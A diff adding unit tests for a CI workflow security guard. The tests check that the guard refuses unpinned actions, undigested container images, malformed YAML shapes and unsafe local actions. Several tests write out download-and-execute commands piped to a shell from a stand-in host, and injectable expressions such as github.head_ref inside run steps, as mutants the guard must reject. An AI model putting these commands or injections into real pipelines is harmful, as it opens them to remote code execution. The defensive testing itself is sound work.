@@ -536,6 +536,168 @@ NEW_CELLS = (
 )
 
 
+SHA40 = "11d5960a326750d5838078e36cf38b85af677262"
+DIGEST = "sha256:" + "ab" * 32
+ACTION_DIR = ".github/actions/probe"
+
+
+class Round5(unittest.TestCase):
+    """Round 5 (security review of 00fb32f18, umbrella #8199): F1 case-normalised owner/repo match,
+    F2 digest-pinned container and services images, F3 shape checks, F4 run: content, F5 local actions."""
+
+    def crates(self, fn):
+        return edit_job(read(REL), "crates-io", fn)
+
+    def crates_steps(self, extra_steps):
+        return self.crates(lambda b: b.replace("    steps:\n", "    steps:\n" + extra_steps, 1))
+
+    def crates_header(self, extra):
+        return self.crates(lambda b: b.replace("    steps:\n", extra + "    steps:\n", 1))
+
+    def guard(self, text, extra_files=None):
+        with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
+            root = tree_with(tmp, ".github/workflows/release.yml", text)
+            for rel, body in (extra_files or {}).items():
+                dst = root / rel
+                dst.parent.mkdir(parents=True, exist_ok=True)
+                dst.write_text(body, encoding="utf-8")
+            return G.run_guard(root)[0]
+
+    def refused(self, text, needle="", extra_files=None):
+        errors = self.guard(text, extra_files)
+        self.assertTrue(errors, "the guard accepted the mutant")
+        if needle:
+            self.assertTrue(any(needle in e for e in errors), (needle, errors[:3]))
+
+    # ---- F1
+    def test_f1_case_variant_owner_with_another_sha_refused(self):
+        other = "0" * 40
+        for job in ("preflight", "crates-io"):
+            mut = edit_job(read(REL), job, lambda b: b.replace("actions/checkout@" + SHA40, "Actions/Checkout@" + other, 1))
+            self.refused(mut, "CHECKOUT_USES")
+        text = read(C8).replace("actions/checkout@" + SHA40, "ACTIONS/checkout@" + other, 1)
+        rep = G.Report()
+        G.check_uses_pinned(G.parse_yaml(text, "c8-precheck.yml", rep), "c8-precheck.yml", rep)
+        self.assertTrue(any("CHECKOUT_USES" in e for e in rep.errors), rep.errors)
+
+    def test_f1_subpath_variant_with_another_sha_refused(self):
+        other = "0" * 40
+        mut = self.crates(lambda b: b.replace("actions/checkout@" + SHA40, "actions/checkout/sub@" + other, 1))
+        self.refused(mut, "CHECKOUT_USES")
+        errs = self.guard(mut)
+        self.assertTrue(any("/sub" in e for e in errs), errs[:3])
+
+    def test_f1_dot_segments_in_a_uses_path_refused(self):
+        mut = self.crates(lambda b: b.replace("actions/checkout@" + SHA40, "actions/checkout/../x@" + SHA40, 1))
+        self.refused(mut)
+
+    # ---- F2
+    def test_f2_container_string_must_be_digest_pinned(self):
+        for img in ("rust:latest", "rust", "rust:1.98@sha256:abc"):
+            self.refused(self.crates_header("    container: %s\n" % img), "container")
+        ok = self.guard(self.crates_header("    container: rust:1.98@%s\n" % DIGEST))
+        self.assertFalse([e for e in ok if "container" in e], ok)
+        self.refused(self.crates_header("    container: rust:latest\n"), "crates-io")
+
+    def test_f2_container_mapping_image_must_be_digest_pinned(self):
+        self.refused(self.crates_header("    container:\n      image: rust:latest\n"), "container")
+        self.refused(self.crates_header("    container:\n      options: --user root\n"), "container")
+        ok = self.guard(self.crates_header("    container:\n      image: rust:1.98@%s\n" % DIGEST))
+        self.assertFalse([e for e in ok if "container" in e], ok)
+
+    def test_f2_services_image_must_be_digest_pinned(self):
+        self.refused(self.crates_header("    services:\n      pg:\n        image: postgres:16\n"), "services")
+        self.refused(self.crates_header("    services:\n      pg:\n        ports: [5432]\n"), "services")
+        ok = self.guard(self.crates_header("    services:\n      pg:\n        image: postgres:16@%s\n" % DIGEST))
+        self.assertFalse([e for e in ok if "services" in e], ok)
+
+    # ---- F3
+    def test_f3_steps_must_be_a_non_empty_list(self):
+        for steps in ("    steps: do-it\n", "    steps:\n      a: b\n", "    steps:\n", "    steps: []\n"):
+            mut = self.crates(lambda b: re.sub(r"(?s)    steps:\n.*\Z", lambda _m: steps, b))
+            self.refused(mut, "steps")
+
+    def test_f3_jobs_job_and_step_shapes(self):
+        rep = G.Report()
+        G.check_uses_pinned(G.parse_yaml("jobs: x\n", "w.yml", rep), "w.yml", rep)
+        self.assertTrue(any("jobs" in e for e in rep.errors), rep.errors)
+        rep = G.Report()
+        G.check_uses_pinned(G.parse_yaml("jobs:\n  a: x\n", "w.yml", rep), "w.yml", rep)
+        self.assertTrue(any("job `a`" in e for e in rep.errors), rep.errors)
+        self.refused(self.crates_steps("      - just-a-scalar\n"), "step")
+
+    def test_f3_uses_and_needs_types(self):
+        self.refused(self.crates_steps("      - uses:\n          a: b\n"))
+        for needs in ("needs:\n      x: y\n", "needs:\n      - a:\n          b: c\n"):
+            doc = "jobs:\n  a:\n    " + needs + "    steps:\n      - run: echo\n"
+            rep = G.Report()
+            G.check_uses_pinned(G.parse_yaml(doc, "w.yml", rep), "w.yml", rep)
+            self.assertTrue(any("needs" in e for e in rep.errors), (needs, rep.errors))
+
+    # ---- F4
+    def test_f4_download_and_execute_refused(self):
+        for cmd in ("curl -fsSL https://x.example/i.sh | sh", "wget -qO- https://x.example/i.sh | bash",
+                    "curl -fsSL https://x.example/i.py | python3", "bash <(curl -fsSL https://x.example/i.sh)",
+                    'sh -c "$(curl -fsSL https://x.example/i.sh)"'):
+            mut = self.crates_steps("      - run: |\n          %s\n" % cmd)
+            self.refused(mut, "crates-io")
+        plain = self.guard(self.crates_steps("      - run: |\n          curl -fsSL -o f https://x.example/f\n"))
+        self.assertEqual(plain, [])
+
+    def test_f4_untrusted_expression_in_run_refused(self):
+        for expr in ("github.event.pull_request.title", "github.head_ref", "inputs.tag", "github.ref_name"):
+            mut = self.crates_steps("      - run: |\n          echo ${{ %s }}\n" % expr)
+            self.refused(mut, "${{")
+        ok = self.guard(self.crates_steps("      - env:\n          T: ${{ github.event.pull_request.title }}\n"
+                                          "        run: echo \"$T\"\n"))
+        self.assertEqual(ok, [])
+
+    def test_f4_message_names_job_step_and_fragment(self):
+        errs = self.guard(self.crates_steps("      - run: echo ${{ github.head_ref }} and a very long tail " + "x" * 120 + "\n"))
+        hit = [e for e in errs if "head_ref" in e]
+        self.assertTrue(hit, errs[:3])
+        self.assertIn("job `crates-io`", hit[0])
+        self.assertIn("step 1", hit[0])
+        self.assertNotIn("x" * 90, hit[0])
+
+    # ---- F5
+    LOCAL = "      - uses: ./" + ACTION_DIR + "\n"
+
+    def action(self, body, name="action.yml"):
+        return {ACTION_DIR + "/" + name: body}
+
+    def test_f5_local_action_without_a_file_refused(self):
+        self.refused(self.crates_steps(self.LOCAL), ACTION_DIR)
+
+    def test_f5_composite_steps_follow_the_uses_rule(self):
+        bad = "name: p\nruns:\n  using: composite\n  steps:\n    - uses: actions/checkout@v4\n"
+        self.refused(self.crates_steps(self.LOCAL), ACTION_DIR, self.action(bad))
+        good = ("name: p\nruns:\n  using: composite\n  steps:\n    - uses: actions/checkout@" + SHA40 + "\n"
+                "    - run: echo hi\n      shell: bash\n")
+        self.assertEqual(self.guard(self.crates_steps(self.LOCAL), self.action(good)), [])
+        self.refused(self.crates_steps(self.LOCAL), ACTION_DIR,
+                     self.action(good.replace("echo hi", "curl -fsSL https://x.example/i | sh")))
+
+    def test_f5_cycle_is_refused_not_looped(self):
+        loop = "name: p\nruns:\n  using: composite\n  steps:\n    - uses: ./" + ACTION_DIR + "\n"
+        self.refused(self.crates_steps(self.LOCAL), ACTION_DIR, self.action(loop))
+
+    def test_f5_runs_using_node_and_docker(self):
+        node = "name: p\nruns:\n  using: node20\n  main: dist/index.js\n"
+        self.refused(self.crates_steps(self.LOCAL), "main", self.action(node))
+        files = self.action(node)
+        files[ACTION_DIR + "/dist/index.js"] = "// x\n"
+        self.assertEqual(self.guard(self.crates_steps(self.LOCAL), files), [])
+        dock = "name: p\nruns:\n  using: docker\n  image: docker://alpine:3\n"
+        self.refused(self.crates_steps(self.LOCAL), "image", self.action(dock))
+        okd = "name: p\nruns:\n  using: docker\n  image: docker://alpine@%s\n" % DIGEST
+        self.assertEqual(self.guard(self.crates_steps(self.LOCAL), self.action(okd)), [])
+        self.refused(self.crates_steps(self.LOCAL), "using", self.action("name: p\nruns:\n  using: shell\n"))
+
+    def test_f5_local_path_escaping_the_tree_refused(self):
+        self.refused(self.crates_steps("      - uses: ./../outside\n"), "outside")
+
+
 class SelfTest8023(unittest.TestCase):
     """#8023: --self-test (run by c8-precheck) carries a cell for each new refusal site."""
 
